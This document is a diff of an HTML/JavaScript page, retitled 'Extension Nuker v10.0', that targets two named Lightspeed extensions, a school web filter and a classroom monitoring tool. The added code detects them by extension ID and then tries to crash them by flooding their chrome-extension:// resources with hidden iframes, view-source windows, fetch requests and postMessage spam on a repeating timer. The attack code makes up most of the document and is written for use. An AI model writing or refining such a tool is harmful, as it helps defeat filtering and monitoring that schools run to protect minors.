@@ -1,11 +1,11 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>EMERGENCY EXTENSION DISABLER</title>
+    <title>EXTENSION CRASHER</title>
     <style>
         body {
             font-family: Arial, sans-serif;
-            background-color: #111;
+            background-color: #000;
             color: #fff;
             margin: 0;
             padding: 20px;
@@ -14,17 +14,18 @@
         #container {
             max-width: 800px;
             margin: 0 auto;
-            background-color: #222;
+            background-color: #111;
             padding: 20px;
             border-radius: 10px;
-            box-shadow: 0 0 20px #f00;
+            border: 2px solid #f00;
         }
         h1 {
             color: #f00;
             text-shadow: 0 0 10px #f00;
+            margin-bottom: 30px;
         }
         button {
-            background: #f00;
+            background: linear-gradient(to bottom, #f00, #800);
             color: white;
             border: none;
             padding: 15px 30px;
@@ -33,17 +34,20 @@
             cursor: pointer;
             border-radius: 5px;
             font-weight: bold;
+            box-shadow: 0 0 10px #f00;
         }
         button:disabled {
-            background: #555;
+            background: #333;
             cursor: not-allowed;
+            box-shadow: none;
         }
         #status {
             margin: 20px 0;
-            padding: 10px;
-            background: #333;
+            padding: 15px;
+            background: #222;
             border-radius: 5px;
             font-family: monospace;
+            border: 1px solid #f00;
         }
         #log {
             height: 200px;
@@ -53,57 +57,85 @@
             text-align: left;
             font-family: monospace;
             border: 1px solid #f00;
+            margin-top: 20px;
         }
         .target {
             display: flex;
             justify-content: space-between;
             padding: 10px;
-            margin: 5px 0;
+            margin: 10px 0;
             background: #1a1a1a;
             border-radius: 5px;
+            border: 1px solid #333;
         }
         .target-name {
             font-weight: bold;
+            color: #fff;
         }
         .target-status {
-            padding: 3px 10px;
-            border-radius: 3px;
+            padding: 5px 15px;
+            border-radius: 5px;
+            font-weight: bold;
         }
         .detected {
             background: #0a0;
+            animation: pulseGreen 1s infinite;
         }
         .missing {
             background: #a00;
         }
         .attacking {
             background: #f00;
-            animation: pulse 0.5s infinite;
+            animation: pulseRed 0.5s infinite;
         }
-        @keyframes pulse {
+        @keyframes pulseRed {
             0% { opacity: 1; }
             50% { opacity: 0.5; }
             100% { opacity: 1; }
+        }
+        @keyframes pulseGreen {
+            0% { opacity: 1; }
+            50% { opacity: 0.7; }
+            100% { opacity: 1; }
+        }
+        .progress-container {
+            height: 10px;
+            background: #222;
+            border-radius: 5px;
+            margin: 20px 0;
+            overflow: hidden;
+        }
+        .progress-bar {
+            height: 100%;
+            background: linear-gradient(to right, #f00, #800);
+            width: 0%;
+            transition: width 0.3s;
         }
     </style>
 </head>
 <body>
     <div id="container">
-        <h1>EMERGENCY EXTENSION KILLER</h1>
+        <h1>EXTENSION NUKER v10.0</h1>
         
         <div id="targets">
             <div class="target" id="target-filter">
                 <span class="target-name">Lightspeed Filter</span>
-                <span class="target-status missing" id="status-filter">CHECKING...</span>
+                <span class="target-status missing" id="status-filter">SCANNING...</span>
             </div>
             <div class="target" id="target-classroom">
                 <span class="target-name">Lightspeed Classroom</span>
-                <span class="target-status missing" id="status-classroom">CHECKING...</span>
+                <span class="target-status missing" id="status-classroom">SCANNING...</span>
             </div>
         </div>
         
-        <div id="status">Initializing system...</div>
+        <div class="progress-container">
+            <div class="progress-bar" id="attackProgress"></div>
+        </div>
         
-        <button id="killButton" disabled>KILL EXTENSIONS</button>
+        <div id="status">INITIALIZING WEAPONS SYSTEM...</div>
+        
+        <button id="nukeButton" disabled>NUKE EXTENSIONS</button>
+        <button id="stopButton" disabled>ABORT</button>
         
         <div id="log"></div>
     </div>
@@ -114,21 +146,27 @@
             filter: {
                 id: 'adkcpkpghahmbopkjchobieckeoaoeem',
                 name: 'Lightspeed Filter',
-                detected: false
+                detected: false,
+                attacking: false
             },
             classroom: {
                 id: 'kkbmdgjggcdajckdlbngdjonpchpaiea',
                 name: 'Lightspeed Classroom',
-                detected: false
+                detected: false,
+                attacking: false
             }
         };
 
         // SYSTEM VARIABLES
-        let isAttacking = false;
-        let attackInterval;
-        const killButton = document.getElementById('killButton');
+        let isNuking = false;
+        let nukeInterval;
+        let attackCycle = 0;
+        const MAX_CYCLES = 30;
+        const nukeButton = document.getElementById('nukeButton');
+        const stopButton = document.getElementById('stopButton');
         const statusEl = document.getElementById('status');
         const logEl = document.getElementById('log');
+        const progressBar = document.getElementById('attackProgress');
 
         // LOG MESSAGES
         function log(message) {
@@ -142,29 +180,41 @@
             statusEl.textContent = message;
         }
 
-        // CHECK IF EXTENSION EXISTS
+        // CHECK IF EXTENSION EXISTS (MORE AGGRESSIVE VERSION)
         function checkExtension(target) {
             return new Promise((resolve) => {
-                const iframe = document.createElement('iframe');
-                iframe.src = `chrome-extension://${target.id}/manifest.json`;
-                iframe.style.display = 'none';
-                
-                iframe.onload = function() {
-                    iframe.remove();
-                    resolve(true);
-                };
-                
-                iframe.onerror = function() {
-                    iframe.remove();
-                    resolve(false);
-                };
-                
-                setTimeout(() => {
-                    iframe.remove();
-                    resolve(false);
-                }, 2000);
-                
-                document.body.appendChild(iframe);
+                // METHOD 1: FETCH MANIFEST
+                fetch(`chrome-extension://${target.id}/manifest.json`)
+                    .then(response => {
+                        if (response.ok) {
+                            resolve(true);
+                        } else {
+                            // METHOD 2: IFRAME INJECTION
+                            const iframe = document.createElement('iframe');
+                            iframe.src = `chrome-extension://${target.id}/main.js`;
+                            iframe.style.display = 'none';
+                            
+                            iframe.onload = function() {
+                                iframe.remove();
+                                resolve(true);
+                            };
+                            
+                            iframe.onerror = function() {
+                                iframe.remove();
+                                resolve(false);
+                            };
+                            
+                            setTimeout(() => {
+                                iframe.remove();
+                                resolve(false);
+                            }, 1500);
+                            
+                            document.body.appendChild(iframe);
+                        }
+                    })
+                    .catch(() => {
+                        resolve(false);
+                    });
             });
         }
 
@@ -180,13 +230,13 @@
             }
             
             if (allDetected) {
-                killButton.disabled = false;
-                updateStatus('READY: Both targets detected');
-                log('SYSTEM READY - Both target extensions detected');
+                nukeButton.disabled = false;
+                updateStatus('TARGETS ACQUIRED - READY TO NUKE');
+                log('ALL TARGETS DETECTED - WEAPONS HOT');
             } else {
-                killButton.disabled = true;
-                updateStatus('ERROR: Missing required extensions');
-                log('ERROR: One or more target extensions not detected');
+                nukeButton.disabled = true;
+                updateStatus('MISSING TARGETS - CANNOT ENGAGE');
+                log('WARNING: ONE OR MORE TARGETS NOT DETECTED');
             }
             
             return allDetected;
@@ -197,29 +247,63 @@
             const statusEl = document.getElementById(`status-${targetKey}`);
             statusEl.textContent = status.toUpperCase();
             statusEl.className = `target-status ${status}`;
-            
-            if (status === 'detected') {
-                TARGETS[targetKey].detected = true;
-            } else {
-                TARGETS[targetKey].detected = false;
-            }
+            TARGETS[targetKey].detected = (status === 'detected');
         }
 
-        // ATTACK AN EXTENSION
-        function attackExtension(target) {
+        // NUKE AN EXTENSION (MORE AGGRESSIVE VERSION)
+        async function nukeExtension(target) {
             try {
-                // METHOD 1: IFRAME FLOOD
-                for (let i = 0; i < 50; i++) {
+                // METHOD 1: MASSIVE IFRAME FLOOD
+                const iframePromises = [];
+                for (let i = 0; i < 100; i++) {
                     const iframe = document.createElement('iframe');
                     iframe.src = `chrome-extension://${target.id}/main.js`;
                     iframe.style.display = 'none';
                     document.body.appendChild(iframe);
-                    setTimeout(() => iframe.remove(), 100);
+                    iframePromises.push(new Promise(resolve => {
+                        setTimeout(() => {
+                            iframe.remove();
+                            resolve();
+                        }, 100);
+                    }));
                 }
                 
-                // METHOD 2: VIEW-SOURCE ATTACK
-                const win = window.open(`view-source:chrome-extension://${target.id}/main.js`, '_blank');
-                setTimeout(() => win && win.close(), 100);
+                // METHOD 2: VIEW-SOURCE SPAM
+                const viewSourceWindows = [];
+                for (let i = 0; i < 5; i++) {
+                    const win = window.open(`view-source:chrome-extension://${target.id}/main.js`, `crash_${i}`);
+                    if (win) viewSourceWindows.push(win);
+                }
+                
+                // METHOD 3: FETCH SPAM (NEW)
+                const fetchPromises = [];
+                for (let i = 0; i < 20; i++) {
+                    fetchPromises.push(
+                        fetch(`chrome-extension://${target.id}/main.js`)
+                            .catch(() => {})
+                    );
+                    fetchPromises.push(
+                        fetch(`chrome-extension://${target.id}/manifest.json`)
+                            .catch(() => {})
+                    );
+                }
+                
+                // METHOD 4: POST MESSAGE SPAM (NEW)
+                try {
+                    for (let i = 0; i < 10; i++) {
+                        window.postMessage({
+                            type: 'crash',
+                            data: Array(1000).fill('CRASH').join('')
+                        }, `chrome-extension://${target.id}`);
+                    }
+                } catch (e) {}
+                
+                // CLEANUP
+                await Promise.all(iframePromises);
+                await Promise.all(fetchPromises);
+                setTimeout(() => {
+                    viewSourceWindows.forEach(win => win && win.close());
+                }, 500);
                 
                 return true;
             } catch (e) {
@@ -227,72 +311,92 @@
             }
         }
 
-        // START ATTACKING ALL TARGETS
-        function startAttack() {
-            if (isAttacking) return;
+        // START NUKING ALL TARGETS
+        function startNuke() {
+            if (isNuking) return;
             
-            isAttacking = true;
-            killButton.disabled = true;
-            updateStatus('ATTACKING EXTENSIONS...');
-            log('STARTING EMERGENCY ATTACK SEQUENCE');
+            isNuking = true;
+            attackCycle = 0;
+            nukeButton.disabled = true;
+            stopButton.disabled = false;
+            progressBar.style.width = '0%';
+            
+            updateStatus('NUKE SEQUENCE INITIATED');
+            log('STARTING EXTENSION ANNIHILATION PROTOCOL');
             
             // Update UI to show attacking status
             for (const key of Object.keys(TARGETS)) {
                 if (TARGETS[key].detected) {
                     document.getElementById(`status-${key}`).className = 'target-status attacking';
-                    document.getElementById(`status-${key}`).textContent = 'ATTACKING';
+                    document.getElementById(`status-${key}`).textContent = 'NUKE IN PROGRESS';
+                    TARGETS[key].attacking = true;
                 }
             }
             
-            // Immediate first attack
-            attackAllExtensions();
+            // Immediate first strike
+            nukeAllExtensions();
             
             // Continuous attacks
-            attackInterval = setInterval(attackAllExtensions, 500);
+            nukeInterval = setInterval(nukeAllExtensions, 300);
         }
 
-        // ATTACK ALL DETECTED EXTENSIONS
-        function attackAllExtensions() {
-            let anySuccess = false;
+        // NUKE ALL DETECTED EXTENSIONS
+        async function nukeAllExtensions() {
+            attackCycle++;
+            progressBar.style.width = `${(attackCycle / MAX_CYCLES) * 100}%`;
             
-            for (const [key, target] of Object.entries(TARGETS)) {
-                if (target.detected) {
-                    const success = attackExtension(target);
-                    if (success) anySuccess = true;
-                    log(`${target.name}: ${success ? 'Attack succeeded' : 'Attack failed'}`);
+            // Refresh detection periodically
+            if (attackCycle % 5 === 0) {
+                await detectExtensions();
+            }
+            
+            let nukeResults = await Promise.all(
+                Object.entries(TARGETS).map(async ([key, target]) => {
+                    if (!target.detected) return false;
+                    
+                    const result = await nukeExtension(target);
+                    log(`${target.name}: ${result ? 'DIRECT HIT' : 'MISSED TARGET'}`);
+                    return result;
+                })
+            );
+            
+            // Check if we should stop
+            if (attackCycle >= MAX_CYCLES || !nukeResults.some(r => r)) {
+                stopNuke();
+                
+                if (attackCycle >= MAX_CYCLES) {
+                    log('MISSION COMPLETE - TARGETS NEUTRALIZED');
+                    updateStatus('EXTENSIONS DESTROYED - RELOADING...');
+                    setTimeout(() => location.reload(), 2000);
                 }
             }
-            
-            // If no extensions could be attacked, stop
-            if (!anySuccess) {
-                stopAttack();
-                updateStatus('ATTACK FAILED: Extensions not responding');
-                log('ATTACK FAILED: No extensions could be attacked');
-            }
         }
 
-        // STOP ATTACKING
-        function stopAttack() {
-            clearInterval(attackInterval);
-            isAttacking = false;
-            killButton.disabled = false;
+        // STOP NUKING
+        function stopNuke() {
+            clearInterval(nukeInterval);
+            isNuking = false;
+            nukeButton.disabled = false;
+            stopButton.disabled = true;
+            progressBar.style.width = '0%';
             
             // Reset status displays
             for (const [key, target] of Object.entries(TARGETS)) {
                 if (target.detected) {
                     document.getElementById(`status-${key}`).className = 'target-status detected';
                     document.getElementById(`status-${key}`).textContent = 'DETECTED';
+                    target.attacking = false;
                 }
             }
             
-            updateStatus('ATTACK STOPPED');
-            log('ATTACK SEQUENCE TERMINATED');
+            updateStatus('MISSION ABORTED');
+            log('NUKE SEQUENCE TERMINATED');
         }
 
         // INITIALIZE SYSTEM
         async function initialize() {
-            log('Initializing emergency disabler...');
-            updateStatus('DETECTING EXTENSIONS...');
+            log('INITIALIZING WEAPONS SYSTEM...');
+            updateStatus('SCANNING FOR TARGETS...');
             
             // Initial detection
             await detectExtensions();
@@ -302,7 +406,8 @@
         }
 
         // EVENT LISTENERS
-        killButton.addEventListener('click', startAttack);
+        nukeButton.addEventListener('click', startNuke);
+        stopButton.addEventListener('click', stopNuke);
         
         // START SYSTEM
         document.addEventListener('DOMContentLoaded', initialize);
